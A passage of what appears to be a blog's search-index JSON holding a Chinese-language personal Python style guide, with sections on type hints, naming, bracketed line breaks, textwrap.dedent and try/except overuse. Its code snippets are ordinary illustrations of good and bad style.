\u53ef\u80fd\u6b64\u65f6\u67d0\u4e9b\u4eba\u770b\u5b8c\u4f1a\u94bb\u725b\u89d2\u5c16\uff0c\u975e\u5f97\u6401\u8fd9\u7ea0\u7ed3\u4ec0\u4e48\u94fe\u8868\u548c\u6570\u7ec4\u6027\u80fd\u5dee\u5f02\u548c\u5b9e\u73b0\u4e0a\u7684\u4e0d\u540c\uff0c\u6211\u5df2\u7ecf\u8bf4\u5f97\u5f88\u6e05\u695a\u4e86\uff0c\u548c\u7ebf\u6027\u8868\u8fd9\u7c7b\u4e1c\u897f\u4f5c\u6bd4\u8f83 \u4ec5\u4ec5\u662f\u4e3a\u4e86\u6253\u6bd4\u65b9 \u3002\u4f60\u8981\u8fd9\u4e48\u7ea0\u7ed3\u4f60\u5c31\u53bb\u7528 np.ndarray \uff0c\u6216\u8005\u5e72\u8106\u522b\u7528 Python \u4e86\uff0c\u76f4\u63a5\u53bb\u7528\u4f60\u5fc3\u7231\u7684 C/C++\uff0c\u800c\u4e0d\u7528\u5728\u8fd9\u7ea0\u7ed3 Python \u7684\u51e0\u4e2a\u5bf9\u8c61\u3002","title":"2.1 \u4f7f\u7528\u5408\u9002\u7684\u5bf9\u8c61\u4f5c\u4e3a\u6570\u636e\u7ed3\u6784"},{"location":"blog/2022/220529-python-personal-styleguide/#22","text":"\u4f7f\u7528\u7c7b\u578b\u6ce8\u91ca\u53ef\u4ee5\u8ba9\u4f60\u7684 IDE \u548c\u5176\u4ed6\u5f00\u53d1\u8005\u66f4\u597d\u5730\u9605\u8bfb\u4f60\u7684\u4ee3\u7801\uff0c\u5e76\u4e14\u5728\u540e\u671f\u7684\u91cd\u6784\u65f6\uff0c\u80fd\u66f4\u5927\u80c6\u5730\u8fdb\u884c\u4ee3\u7801\u590d\u7528\uff0c\u800c\u65e0\u987b\u7ea0\u7ed3\u53c2\u6570\u7684\u7c7b\u578b\u3002 Example Good: def foo ( x : int , y : int ) -> int : return x + y Bad: def foo ( x , y ): return x + y \u53ef\u4ee5\u4f7f\u7528 typing \u6807\u51c6\u5e93\u6765\u7f16\u5199\u66f4\u9ad8\u7ea7\u7684\u7c7b\u578b\u6ce8\u91ca\uff0c\u4f8b\u5982\uff1a Example from typing import TypeVar , Union RealNumeric = TypeVar ( 'RealNumeric' , int , float ) def create_complex ( re : RealNumeric = 0 , im : RealNumeric = 0 ) -> Union [ RealNumeric , complex ]: return re + im * 1 j \u751a\u81f3\u4f7f\u7528\u6cdb\u578b\uff1a Example from typing import TypeVar _T = TypeVar ( '_T' ) def if_pattern ( pattern : list [ tuple [ bool , _T ]]) -> _T : return filter ( lambda x : x [ 0 ], pattern ) . __next__ ()[ 1 ]","title":"2.2 \u79ef\u6781\u4f7f\u7528\u7c7b\u578b\u6ce8\u91ca"},{"location":"blog/2022/220529-python-personal-styleguide/#23","text":"Example Ugly: def calc ( const : Optional [ float ], rating : Optional [ float ], score : Optional [ float ]) -> float : if const is None : return calc_const ( rating , score ) if rating is None : return calc_rating ( const , score ) if score is None : return calc_score ( const , rating ) else : raise ValueError ( 'Invalid input!' ) \u8bf7\u6ce8\u610f\uff0c\u8fd9\u662f\u6211\u66fe\u7ecf\u7528\u4e8e\u8ba1\u7b97\u67d0\u4e2a\ud83c\uddec\ud83c\udde7\u6e38\u620f\u7684\u4e00\u4e9b\u6570\u503c\u65f6\u91c7\u7528\u7684\u51fd\u6570\u5199\u6cd5\uff0c\u73b0\u5728\u6211\u89c9\u5f97\u5b83\u5947\u4e11\u65e0\u6bd4\u3002","title":"2.3 \u51fd\u6570\u7684\u529f\u80fd\u5e94\u5177\u6709\u4e13\u4e00\u6027"},{"location":"blog/2022/220529-python-personal-styleguide/#_3","text":"","title":"\u4e09\u3001\u8be5\u53d6\u4ee3\u4ec0\u4e48"},{"location":"blog/2022/220529-python-personal-styleguide/#31","text":"\u4ee5\u5224\u65ad\u5b57\u5178\u4e2d\u662f\u5426\u6709\u67d0\u4e2a\u952e\u7684\u65b9\u6cd5\u4e3a\u4f8b\uff1a Example Good: if 'some_key' in d : ... Bad: if d . __contains__ ( 'some_key' ): ... if d . has_key ( 'some_key' ): ... \u5e76\u4e14\u8bf7\u6ce8\u610f\uff1a\u4e8b\u5b9e\u4e0a\uff0c dict \u7c7b\u7684 has_key () \u65b9\u6cd5\u5df2\u7ecf \u5728 Python3 \u4e2d\u88ab\u79fb\u9664 \uff0c\u6240\u4ee5\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u4f60\u4e5f\u7528\u4e0d\u7740\u5b83\uff08\u6216\u8005\u6ca1\u6cd5\u7528\u5b83\uff09\u3002 \u7531\u4e8e Python \u81ea\u8eab\u7684\u6027\u8d28\uff0c\u4f7f\u7528 Python \u5b9e\u73b0\u4e00\u4e2a\u7279\u5b9a\u7684\u529f\u80fd\u975e\u5e38\u5bb9\u6613\uff0c\u4f46\u4e5f\u6b63\u56e0\u4e3a\u5982\u6b64\uff0c\u6709\u4e0d\u5c11\u521d\u5b66\u8005\u5728\u5b66\u4e60\u524d\u671f\u4f1a\u4f7f\u7528\u5927\u91cf\u7684\u81ea\u884c\u5b9e\u73b0\uff0c\u8fd9\u79cd\u81ea\u884c\u5b9e\u73b0\u53c8\u5e38\u5e38\u88ab\u79f0\u4e3a \u91cd\u590d\u53d1\u660e\u8f6e\u5b50 \u3002 \u91cd\u590d\u53d1\u660e\u8f6e\u5b50\u5e76\u4e0d\u4e00\u65e0\u662f\u5904\uff0c\u5bf9\u4e8e\u521d\u5b66\u8005\u800c\u8a00\uff0c\u8fd9\u5e38\u5e38\u662f\u4e00\u79cd\u63d0\u5347\u81ea\u8eab\u57fa\u672c\u80fd\u529b\u7684\u6709\u6548\u624b\u6bb5\u3002\u7136\u800c\u5bf9\u4e8e\u5e76\u975e\u521d\u5b66\u8005\u7684\u6211\u4eec\uff0c\u91cd\u590d\u53d1\u660e\u8f6e\u5b50\u5df2\u7ecf\u4e0d\u518d\u6709\u4efb\u4f55\u7528\u9014\u4e86\uff0c\u56e0\u6b64\u9700\u8981\u6781\u529b\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u9009\u62e9\u5177\u4f53\u7684\u5b9e\u73b0\u65b9\u6cd5\u65f6\uff0c\u8003\u8651\u4ee5\u4e0b\u4f18\u5148\u987a\u5e8f\uff1a \u8bed\u53e5\u3001 Builtins \u51fd\u6570 \u9b54\u6cd5\u65b9\u6cd5 \u3001\u65b9\u6cd5 Python \u6807\u51c6\u5e93 \u7b2c\u4e09\u65b9\u5e93 \u81ea\u884c\u5b9e\u73b0 \u5728\u591a\u79cd\u5b9e\u73b0\u7684\u590d\u6742\u5ea6\u76f8\u5dee\u65e0\u51e0\u65f6\uff0c\u4e0a\u9762\u6392\u5e8f\u8d8a\u9760\u524d\u7684\u5b9e\u73b0\u65b9\u6cd5\u770b\u8d77\u6765\u8d8a\u4f18\u96c5\uff0c\u800c\u8d8a\u5f80\u540e\u7684\u5b9e\u73b0\u65b9\u6cd5\u770b\u8d77\u6765\u8d8a\u4e11\u964b\u3002\u53ea\u6709\u5728\u4f60\u53d1\u73b0\u9760\u524d\u7684\u65b9\u6cd5\u65e0\u6cd5\u6ee1\u8db3\u4f60\u7684\u9700\u6c42\uff08\u6216\u8fc7\u4e8e\u590d\u6742\uff09\u65f6\uff0c\u624d\u6709\u5fc5\u8981\u8003\u8651\u9760\u540e\u7684\u65b9\u6cd5\u3002","title":"3.1 \u4f7f\u7528\u4f18\u7f8e\u7684\u73b0\u6709\u65b9\u6cd5\u53d6\u4ee3\u4e11\u964b\u7684\u81ea\u884c\u5b9e\u73b0"},{"location":"blog/2022/220529-python-personal-styleguide/#32","text":"Python \u4e2d\u7684\u62ec\u53f7\u6709\u4e2a \u7279\u6027 \uff0c\u5c31\u662f\u62ec\u53f7\u4e2d\u7684\u8868\u8fbe\u5f0f\u53ef\u4ee5\u5728\u4e00\u4e2a\u884c\u4e0a\u76f4\u63a5\u5206\u5272\uff0c\u800c\u65e0\u987b\u4f7f\u7528 \\ \u6362\u884c\u3002 \u4ee5 import \u8bed\u53e5\u4e3a\u4f8b\uff1a Example Good: from .make_score_image import ( moe_draw_recent , guin_draw_recent , bandori_draw_recent , andreal_v1_draw_recent , andreal_v2_draw_recent , andreal_v3_draw_recent , andreal_draw_b30 , song_list , draw_b30 , ) Bad: from .make_score_image import moe_draw_recent , guin_draw_recent , bandori_draw_recent , song_list , draw_b30 , \\ andreal_v1_draw_recent , andreal_v2_draw_recent , andreal_v3_draw_recent , andreal_draw_b30 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728\u62ec\u53f7\u5185\u8fdb\u884c\u6362\u884c\u540e\uff0c\u8bf7\u6ce8\u610f\u7f29\u8fdb\u3002\u8981\u4e48\u4f7f\u7528\u5782\u76f4\u7f29\u8fdb\uff0c\u8981\u4e48\u4f7f\u7528\u60ac\u6302\u7f29\u8fdb\u3002 \u4ee5 if \u8bed\u53e5\u4e3a\u4f8b\uff1a Example Good: # 4\u7a7a\u683c\u60ac\u6302\u7f29\u8fdb if ( this_vid != last_vid or this_vid == last_vid and ( this_lang in [ 'zh-Hans' , 'zh' ] or this_lang == 'ja' and last_lang not in [ 'zh-Hans' , 'zh' ] or this_lang == 'en' and last_lang not in [ 'zh-Hans' , 'zh' , 'ja' ] ) ): ... # \u4f7f\u7528\u5782\u76f4\u7f29\u8fdb if ( this_vid != last_vid or this_vid == last_vid and ( this_lang in [ 'zh-Hans' , 'zh' ] or this_lang == 'ja' and last_lang not in [ 'zh-Hans' , 'zh' ] or this_lang == 'en' and last_lang not in [ 'zh-Hans' , 'zh' , 'ja' ])): ... Bad: # \u65e0\u4efb\u4f55\u7f29\u8fdb if this_vid != last_vid or this_vid == last_vid and ( this_lang in [ 'zh-Hans' , 'zh' ] or this_lang == 'ja' and last_lang not in [ 'zh-Hans' , 'zh' ] or this_lang == 'en' and last_lang not in [ 'zh-Hans' , 'zh' , 'ja' ]): ... # \u4f7f\u7528\u4e11\u964b\u7684 \\ \u8fdb\u884c\u6362\u884c if this_vid != last_vid or this_vid == last_vid \\ and ( this_lang in [ 'zh-Hans' , 'zh' ] or this_lang == 'ja' \\ and last_lang not in [ 'zh-Hans' , 'zh' ] or this_lang == 'en' \\ and last_lang not in [ 'zh-Hans' , 'zh' , 'ja' ]): ... # 4\u7a7a\u683c\u60ac\u6302\u7f29\u8fdb\u5bf9\u9f50\u5230 if if this_vid != last_vid or this_vid == last_vid and ( this_lang in [ 'zh-Hans' , 'zh' ] or this_lang == 'ja' and last_lang not in [ 'zh-Hans' , 'zh' ] or this_lang == 'en' and last_lang not in [ 'zh-Hans' , 'zh' , 'ja' ]): ... \u4ee5\u5b57\u7b26\u4e32\u7684\u591a\u884c\u62fc\u63a5\u4e3a\u4f8b\uff1a Example Good: text = ( f '\u9879\u76ee\uff1a { repo . name } \\n ' f '\u4f5c\u8005\uff1a { owner } \\n ' f '\u5927\u5c0f\uff1a { repo . size } KB \\n ' f '\u8bed\u8a00\uff1a { repo . language or \"\u65e0\" } \\n ' f '\u8bb8\u53ef\u8bc1\uff1a { license_ } \\n ' f '\ud83d\udc1e: { repo . open_issues_count } \u2b50: { repo . stargazers_count } \ud83c\udf74: { repo . forks_count } \\n ' f '\u521b\u5efa\u65f6\u95f4\uff1a { format_time ( repo . created_at ) } \\n ' f '\u4e0a\u6b21\u63d0\u4ea4\uff1a { format_time ( repo . pushed_at ) } \\n ' f '\u63cf\u8ff0\uff1a { repo . description or \"\u65e0\" } \\n ' f '\u6807\u7b7e\uff1a { tags } ' ) Bad: text = f '\u9879\u76ee\uff1a { repo . name } \\n ' \\ f '\u4f5c\u8005\uff1a { owner } \\n ' \\ f '\u5927\u5c0f\uff1a { repo . size } KB \\n ' \\ f '\u8bed\u8a00\uff1a { repo . language or \"\u65e0\" } \\n ' \\ f '\u8bb8\u53ef\u8bc1\uff1a { license_ } \\n ' \\ f '\ud83d\udc1e: { repo . open_issues_count } \u2b50: { repo . stargazers_count } \ud83c\udf74: { repo . forks_count } \\n ' \\ f '\u521b\u5efa\u65f6\u95f4\uff1a { format_time ( repo . created_at ) } \\n ' \\ f '\u4e0a\u6b21\u63d0\u4ea4\uff1a { format_time ( repo . pushed_at ) } \\n ' \\ f '\u63cf\u8ff0\uff1a { repo . description or \"\u65e0\" } \\n ' \\ f '\u6807\u7b7e\uff1a { tags } ' \u63d0\u793a\uff1a\u5bf9\u4e8e\u9700\u8981\u5f88\u591a\u6362\u884c\u7684\u5b57\u7b26\u4e32\uff0c\u4f7f\u7528 \"\"\" \u642d\u914d textwrap.dedent() \u662f \u6700\u4f18 \u7684\u9009\u62e9\uff1a Example \u2b50 Best: import textwrap text = textwrap . dedent ( f \"\"\" \u9879\u76ee\uff1a { repo . name } \u4f5c\u8005\uff1a { owner } \u5927\u5c0f\uff1a { repo . size } KB \u8bed\u8a00\uff1a { repo . language or \"\u65e0\" } \u8bb8\u53ef\u8bc1\uff1a { license_ } \ud83d\udc1e: { repo . open_issues_count } \u2b50: { repo . stargazers_count } \ud83c\udf74: { repo . forks_count } \u521b\u5efa\u65f6\u95f4\uff1a { format_time ( repo . created_at ) } \u4e0a\u6b21\u63d0\u4ea4\uff1a { format_time ( repo . pushed_at ) } \u63cf\u8ff0\uff1a { repo . description or \"\u65e0\" } \u6807\u7b7e\uff1a { tags } \"\"\" ) textwrap \u662f Python \u6807\u51c6\u5e93\u4e4b\u4e00\uff0c\u5176\u4e2d\u7684 dedent() \u51fd\u6570\u53ef\u4ee5\u79fb\u9664 text \u4e2d\u6bcf\u4e00\u884c\u7684\u4efb\u4f55\u76f8\u540c\u524d\u7f00\u7a7a\u767d\u7b26\u3002\u8fd9\u53ef\u4ee5\u7528\u6765\u6e05\u9664\u4e09\u91cd\u5f15\u53f7\u5b57\u7b26\u4e32\u884c\u5de6\u4fa7\u7a7a\u683c\uff0c\u5e76\u5728\u6e90\u7801\u4e2d\u4ecd\u7136\u663e\u793a\u4e3a\u7f29\u8fdb\u683c\u5f0f\u3002","title":"3.2 \u4f7f\u7528\u62ec\u53f7\u6362\u884c\u53d6\u4ee3\u6362\u884c\u7b26\u6362\u884c"},{"location":"blog/2022/220529-python-personal-styleguide/#_4","text":"","title":"\u56db\u3001\u8be5\u907f\u514d\u4ec0\u4e48"},{"location":"blog/2022/220529-python-personal-styleguide/#41","text":"\u5f15\u7528 \u6539\u540d\u4e0d\u4ec5\u4ec5\u662f\u4fee\u6539\u540d\u5b57\u800c\u5df2\u3002\u5982\u679c\u4f60\u60f3\u4e0d\u51fa\u4e00\u4e2a\u597d\u540d\u5b57\uff0c\u8bf4\u660e\u80cc\u540e\u5f88\u53ef\u80fd\u6f5c\u85cf\u7740\u66f4\u6df1\u7684\u8bbe\u8ba1\u95ee\u9898\u3002\u4e3a\u4e00\u4e2a\u607c\u4eba\u7684\u540d\u5b57\u6240\u4ed8\u51fa\u7684\u7ea0\u7ed3\uff0c\u5e38\u5e38\u80fd\u63a8\u52a8\u6211\u4eec\u5bf9\u4ee3\u7801\u8fdb\u884c\u7cbe\u7b80\u3002 \u2014\u2014 \u300a\u91cd\u6784\uff1a\u6539\u5584\u65e2\u6709\u4ee3\u7801\u7684\u8bbe\u8ba1\u300b \u547d\u540d\u662f\u7a0b\u5e8f\u5458\u6700\u96be\u89e3\u51b3\u7684\u4e00\u4e2a\u95ee\u9898\u4e4b\u4e00\uff0c\u800c\u8ff7\u60d1\u547d\u540d\u5c06\u5bfc\u81f4\u540e\u671f\u91cd\u6784\u65f6\u65e0\u6cd5\u6b63\u786e\u7406\u89e3\u5bf9\u8c61\u7684\u542b\u4e49\u3002 \u867d\u7136\u6211\u4eec\u65e0\u6cd5\u505a\u5230 100% \u7684\u5b8c\u7f8e\u547d\u540d\uff0c\u4f7f\u6bcf\u4e2a\u5bf9\u8c61\u7684\u540d\u5b57\u90fd\u6070\u5230\u597d\u5904\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u907f\u514d\u51fa\u73b0\u8ff7\u60d1\u547d\u540d\u3002\u4e00\u4e2a\u4e0d\u4f73\u7684\u547d\u540d\u53ef\u80fd\u4ec5\u4ec5\u4f1a\u7ed9\u9605\u8bfb\u4ee3\u7801\u5e26\u6765\u56f0\u96be\uff0c\u800c\u8ff7\u60d1\u547d\u540d\u5219\u4f1a\u4f7f\u6211\u4eec\u5b8c\u5168\u6df7\u6dc6\u4ee3\u7801\u7684\u542b\u4e49\u3002\u4ee5\u4e0b\u5217\u4e3e\u4e86\u4e00\u4e9b\u8ff7\u60d1\u547d\u540d\u7684\u4f8b\u5b50\uff1a \u6df7\u6dc6\u4f7f\u7528\u5143\u7d20\u5217\u8868\u547d\u540d Example for user in user_list : print ( user ) for user in users : print ( user ) user_list \u548c users \u90fd\u53ef\u4ee5\u8868\u793a\u4e00\u4e2a\u5b58\u50a8\u7528\u6237\u4fe1\u606f\u7684\u5217\u8868\u3002\u5047\u5982\u4e00\u4e2a\u8fc7\u7a0b\u5185\u540c\u65f6\u5b9a\u4e49\u4e86 user_list \u548c users \uff0c\u4f60\u4f1a\u600e\u6837\u53bb\u533a\u5206\u5462\uff1f\u6700\u597d\u7684\u65b9\u6cd5\u662f\u53ea\u4f7f\u7528\u5176\u4e2d\u7684\u4e00\u79cd\u547d\u540d\u65b9\u5f0f\uff0c\u800c\u6211\u9009\u62e9\u7684\u662f\u524d\u8005\uff08\u540e\u8005\u5f53\u7136\u4e5f\u884c\uff0c\u4f46\u8bf7\u4e0d\u8981\u6df7\u6dc6\u4f7f\u7528\uff01\uff09 \u6df7\u6dc6\u4f7f\u7528\u4e0b\u5212\u7ebf Example song_list : list [ Song ] = [] songlist : dict [ str , Any ] = {} \u4ee5\u4e0a\u5199\u6cd5\u975e\u5e38\u4ee4\u4eba\u8ff7\u60d1\uff0c song_list \u548c songlist \u53ef\u80fd\u90fd\u662f\u8868\u793a\u67d0\u4e2a\ud83c\uddec\ud83c\udde7\u6e38\u620f\u7684\u6b4c\u66f2\u5217\u8868\uff0c\u4f46\u662f\u8868\u793a\u8fd9\u4e2a \u201c\u5217\u8868\u201d \u7684\u6570\u636e\u7ed3\u6784\u5374\u662f\u4e0d\u540c\u7684\u3002\u5728\u540c\u4e00\u4e2a\u8fc7\u7a0b\u5185\u90e8\u540c\u65f6\u4f7f\u7528\u8fd9\u4e24\u4e2a\u53d8\u91cf\u5c06\u4f1a\u4f7f\u5176\u4ed6\u5f00\u53d1\u8005\uff08\u751a\u81f3\u81ea\u5df1\uff01\uff09\u5728\u8c03\u7528\u5b83\u4eec\u65f6\u7f54\u77e5\u6240\u63aa\u3002 \u5f97\u4e8f\u8fd9\u662f\u6709 typing hint \u7684\u60c5\u51b5\uff0c\u8981\u662f\u9047\u5230\u4e00\u4e9b\u6ca1\u6709\u6807\u6ce8 typing hint \u8fd8\u8fd9\u6837\u5199\u7684\u4ee3\u7801\uff08 \u4f8b\u5982\u6211\u7684\u65e9\u671f\u4ee3\u7801 \uff09\uff0c\u90a3\u5c31\u771f\u7684\u8ba9\u4eba\u80cc\u5730\u91cc\u60f3\u9a82\u4eba\u4e86\u3002 \u53d8\u91cf\u540d\u52a0\u5165\u7d2f\u8d58\u7684\u524d/\u540e\u7f00 Example user : dict [ str , Any ] = {} user_data : dict [ str , Any ] = {} user_info : dict [ str , Any ] = {} user_detail : dict [ str , Any ] = {} user_metadata : dict [ str , Any ] = {} user_information : dict [ str , Any ] = {} \u8fd9\u79cd\u547d\u540d\u4f55\u6b62\u662f\u8ff7\u60d1\uff0c\u7b80\u76f4\u662f\u4ee4\u4eba\u607c\u706b\uff01\u5047\u5982\u4e00\u4e2a\u8fc7\u7a0b\u5185\u540c\u65f6\u5b9a\u4e49\u4e86 user \u3001 user_data \u3001 user_info \u3001 user_detail \u3001 user_metadata \u548c user_information \uff0c\u5982\u679c\u6211\u8981\u83b7\u53d6\u7528\u6237\u7684\u4fe1\u606f\uff0c\u8bf7\u95ee\u6211\u8be5\u8c03\u7528\u90a3\u4e2a\u53d8\u91cf\u5462\uff1f \u5efa\u8bae\u5728\u65b0\u7684\u53d8\u91cf\u547d\u540d\u4e4b\u524d\uff0c\u4ed4\u7ec6\u68c0\u67e5\u5df2\u7ecf\u547d\u540d\u8fc7\u7684\u53d8\u91cf\uff0c\u5982\u679c\u51fa\u73b0\u8fd9\u79cd\u591a\u4e2a\u4e0d\u540c\u540e\u7f00\u8868\u793a\u540c\u4e00\u6570\u636e\u7684\u60c5\u51b5\uff0c\u5219\u53ef\u80fd\u8bf4\u660e \u8fd9\u5df2\u7ecf\u4e0d\u662f\u7b80\u5355\u7684\u547d\u540d\u95ee\u9898\u4e86 \u3002 \u4e0d\u6070\u5f53\u7684\u7f29\u5199 Example Good: def get_classifier_K_nearest_neighbors ( dataset : Dataset , k : int ) -> Classifier : ... Bad: def get_classifier_KNN ( dataset : Dataset , k : int ) -> Classifier : ... KNN \u6307\u7684\u662f K-\u8fd1\u90bb\u7b97\u6cd5 \uff0c\u662f\u4e00\u79cd\u7528\u4e8e\u5206\u7c7b\u548c\u56de\u5f52\u7684\u975e\u53c2\u6570\u7edf\u8ba1\u65b9\u6cd5\uff0c\u501f\u7531\u8ba1\u7b97\u4e0e\u5df2\u77e5\u7c7b\u522b\u6848\u4f8b\u4e4b\u76f8\u4f3c\u5ea6\uff0c\u6765\u8bc4\u4f30\u672a\u77e5\u7c7b\u522b\u6848\u4f8b\u53ef\u80fd\u7684\u5206\u7c7b\u3002 \u4f7f\u7528\u7f29\u5199\u7684\u65b9\u5f0f\uff0c\u53ef\u80fd\u4f1a\u4f7f\u4ee3\u7801\u66f4\u52a0\u7b80\u6d01\uff0c\u4f46\u662f\u4e5f\u4f1a\u4f7f\u4ee3\u7801\u66f4\u52a0\u96be\u4ee5\u7406\u89e3\uff0c\u5c24\u5176\u662f\u4ee5\u4e0a\u8fd9\u79cd\u53ea\u6709\u5728\u4e13\u4e1a\u9886\u57df\u624d\u4f1a\u7528\u5230\u7684\u7f29\u5199\u3002 \u6df7\u6dc6\u4f7f\u7528\u81ea\u5b9a\u4e49\u5f02\u5e38\u7684\u540e\u7f00 Example class PotentialHiddenError ( RuntimeError ): ... class PotentialHiddenException ( RuntimeError ): ... \u5047\u8bbe\u4e00\u4e2a\u6708\u524d\u4f60\u5728 exceptions.py \u91cc\u5b9a\u4e49\u4e86\u8fd9\u4e24\u4e2a\u5f02\u5e38\uff0c\u4e00\u4e2a\u6708\u4e4b\u540e\u4f60\u9879\u76ee\u7684\u5176\u4ed6\u8d21\u732e\u8005\u5199\u4ee3\u7801\u7684\u65f6\u5019\u9700\u8981\u629b\u51fa\u4e00\u4e2a \u201c\u7528\u6237\u6f5c\u529b\u503c\u88ab\u9690\u85cf\u201d \u7684\u5f02\u5e38\uff0c\u8bf7\u95ee\u8be5\u629b\u51fa\u8c01\uff1f\u8fd9\u79cd\u8ff7\u60d1\uff08\u6df7\u6dc6\uff09\u60c5\u5f62\u548c\u5148\u524d\u63d0\u5230\u7684\u7b80\u76f4\u662f\u6b8a\u9014\u540c\u5f52\u3002 \u6b64\u5916\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 Python \u4e2d\uff0c\u66f4\u5e38\u7528\u7684\u5f02\u5e38\u7684\u540e\u7f00\u662f Error \uff0c\u800c\u4e0d\u662f Exception \u3002\uff08\u89c1\u5b98\u65b9\u6587\u6863\u4e2d\u7684 \u7528\u6237\u81ea\u5b9a\u4e49\u5f02\u5e38 \uff09 \u547d\u540d\u7684\u5177\u4f53\u5199\u6cd5\u5e76\u4e0d\u662f\u8be5\u8282\u7684\u8ba8\u8bba\u91cd\u70b9\uff0c\u9a7c\u5cf0\u547d\u540d\u6cd5\u3001\u4e0b\u5212\u7ebf\u547d\u540d\u6cd5\u548c\u5308\u7259\u5229\u547d\u540d\u6cd5\u7684\u5177\u4f53\u5185\u5bb9\u4e5f\u5df2\u4eba\u5c3d\u7686\u77e5\uff0c\u8fd9\u91cc\u4fbf\u4e0d\u518d\u8d58\u8ff0\u3002 \u5177\u4f53\u53ef\u4ee5\u53c2\u7167 Python \u4e4b\u7236 Guido \u63a8\u8350\u7684\u89c4\u8303\uff1a Type Public Internal Modules lower_with_under _lower_with_under Packages lower_with_under Classes CapWords _CapWords Exceptions CapWords Functions lower_with_under() _lower_with_under() Global/Class Constants CAPS_WITH_UNDER _CAPS_WITH_UNDER Global/Class Variables lower_with_under _lower_with_under Instance Variables lower_with_under _lower_with_under (protected) __lower_with_under (private) Method Names lower_with_under() _lower_with_under() (protected) __lower_with_under() (private) Function/Method Parameters lower_with_under Local Variables lower_with_under \u548c PEP-8 \u4e00\u6837\uff0c\u67d0\u4e9b IDE\uff08\u4f8b\u5982 PyCharm\uff09\u6216\u8005\u63d2\u4ef6\uff08\u4f8b\u5982 SonarLint\uff09\u4e5f\u53ef\u4ee5\u81ea\u52a8\u6807\u8bb0\u4f60\u4ee3\u7801\u4e2d\u4e0d\u9075\u5b88\u4e0a\u8ff0\u547d\u540d\u6cd5\u7684\u60c5\u51b5\u3002","title":"4.1 \u907f\u514d\u8ff7\u60d1\u547d\u540d"},{"location":"blog/2022/220529-python-personal-styleguide/#42","text":"\u5982\u679c\u4f60\u53d1\u73b0\u4e00\u4e2a\u51fd\u6570\u7684\u957f\u5ea6\u8d85\u8fc7\u4e8650\u884c\uff0c\u90a3\u4e48\u5927\u6982\u7387\u8bf4\u660e\u8fd9\u4e2a\u51fd\u6570\u9700\u8981\u7cbe\u7b80\u3002 TODO","title":"4.2 \u907f\u514d\u8fc7\u957f\u7684\u51fd\u6570"},{"location":"blog/2022/220529-python-personal-styleguide/#43","text":"TODO","title":"4.3 \u907f\u514d\u6784\u9020\u91cd\u590d\u7684\u51fd\u6570"},{"location":"blog/2022/220529-python-personal-styleguide/#44-try-except","text":"\u4e0d\u8981\u61d2\u60f0\u5230\u8ba9 try except \u8bed\u53e5\u6765\u5e2e\u4f60\u627e\u5230\u9519\u8bef\uff01 try except \u8bed\u53e5\u901a\u5e38\u662f\u7528\u4e8e\u5904\u7406\u9519\u8bef\u548c\u5f02\u5e38\u7684\uff0c\u4f46\u8fd9\u4e0d\u610f\u5473\u7740\u6240\u6709\u7684\u9519\u8bef\u548c\u5f02\u5e38\u90fd\u5fc5\u987b\u7ecf\u8fc7\u5b83\u7684\u624b\u5904\u7406\u3002\u5982\u679c\u662f\u4e00\u4e9b\u663e\u800c\u6613\u89c1\u7684\u9519\u8bef\uff0c\u5219\u5e94\u5f53\u907f\u514d\u4f7f\u7528 try except \u8bed\u53e5\uff0c\u800c\u662f\u76f4\u63a5\u6d88\u5316\u8fd9\u4e2a\u53ef\u80fd\u629b\u51fa\u7684\u5f02\u5e38\u3002 Example Good: def get_player_name ( play_record : dict [ str , Any ]) -> str : if play_record and 'name' in play_record [ 0 ]: return play_record [ 0 ][ 'name' ] else : return 'Unknown' Bad: def get_player_name ( play_record : dict [ str , Any ]) -> str : try : return play_record [ 0 ][ 'name' ] except ( KeyError , IndexError ): return 'Unknown' \u6b64\u4e3e\u662f\u4e3a\u4e86\u660e\u786e\u9519\u8bef\u7684\u539f\u56e0\u3002\u4ee5\u4e0a\u9762\u4e3a\u4f8b\uff0c\u5728\u5bf9\u4e00\u4e2a list \u6216 dict \u53cd\u590d\u4f7f\u7528 __getitem__ \u65f6\uff08\u4f8b\u5982\u6709\u4e9b\u6784\u9020\u590d\u6742\u7684 json \u53ef\u80fd\u4f1a\u5d4c\u5957\u597d\u51e0\u5c42\uff09\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4 KeyError \u548c IndexError \u7684\u9519\u8bef\u3002\u4f46\u662f\u7b80\u5355\u5730\u63a5\u4f4f\u9519\u8bef\u5e76\u4e0d\u80fd\u77e5\u9053\u5177\u4f53\u662f\u54ea\u4e2a\u5730\u65b9\u8c03\u7528 __getitem__ \u65b9\u6cd5\u65f6\u51fa\u9519\u4e86\uff0c\u662f\u4e00\u79cd\u6666\u6da9\u7684\u5904\u7406\u65b9\u6cd5\u3002","title":"4.4 \u907f\u514d\u6ee5\u7528 try except \u8bed\u53e5"},{"location":"blog/2022/220529-python-personal-styleguide/#45","text":"\u4ec0\u4e48\u662f\u81ea\u5df1\u4e0d\u8be5\u5904\u7406\u7684\u9519\u8bef\uff1f \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u4f60\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u8bfb\u53d6\u4e00\u4e2a json \u6587\u4ef6\uff0c\u5e76\u5c06\u5176\u8f6c\u6362\u4e3a\u4e00\u4e2a dict \u5bf9\u8c61\u3002 \u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff1a \u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u51fd\u6570\u600e\u4e48\u529e\uff1f \u5982\u679c\u6587\u4ef6\u5185\u5bb9\u4e0d\u662f\u4e00\u4e2a json \u5b57\u7b26\u4e32\uff0c\u51fd\u6570\u600e\u4e48\u529e\uff1f \u4e00\u4e9b\u5f00\u53d1\u8005\u53ef\u80fd\u4f1a\u8ba9\u8be5\u51fd\u6570\u9047\u5230\u9519\u8bef\u65f6\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u5178\uff0c\u6216\u8005\u8fd4\u56de None \u5bf9\u8c61\u3002\u6211\u4e2a\u4eba\u662f\u5f88\u4e0d\u8d5e\u540c\u8fd9\u4e2a\u505a\u6cd5\u7684\u3002 